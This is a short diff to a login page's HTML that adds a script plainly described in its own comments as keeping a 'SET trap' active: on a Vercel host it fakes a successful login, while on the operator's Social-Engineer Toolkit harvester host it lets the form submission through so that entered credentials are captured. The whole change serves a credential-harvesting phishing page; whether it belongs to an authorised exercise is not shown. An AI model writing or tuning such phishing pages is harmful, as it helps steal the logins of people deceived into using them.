@@ -49,6 +49,20 @@
         </div>
     </div>
 
-    <!-- JavaScript removed for SET Harvester compatibility -->
+    <script>
+        // SMART REDIRECT: Fixes 405 error on Vercel while keeping SET trap active
+        const form = document.getElementById('loginForm');
+        
+        if (window.location.hostname.includes('vercel.app')) {
+            // On Vercel: Prevent the POST request to avoid the 405 error
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                localStorage.setItem('loggedin', 'true');
+                localStorage.setItem('username', 'ABC');
+                window.location.href = 'pm_dashboard.html';
+            });
+        }
+        // On your SET IP: The script does nothing, allowing the POST to be captured!
+    </script>
 </body>
 </html>
